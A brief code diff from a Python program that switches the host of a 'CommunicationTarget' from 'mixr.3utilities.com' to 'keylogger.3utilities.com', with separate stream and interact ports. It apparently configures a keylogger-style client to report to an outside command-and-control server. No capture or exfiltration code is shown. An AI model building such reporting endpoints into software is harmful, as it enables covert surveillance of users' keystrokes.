@@ -11,7 +11,7 @@ def main():
 	if temp_path is None:
 		sys.exit(1)
 
-	communication = CommunicationTarget(ip_address='mixr.3utilities.com',
+	communication = CommunicationTarget(ip_address='keylogger.3utilities.com',
 		port_stream=10001, port_interact=10002)
 
 	try:
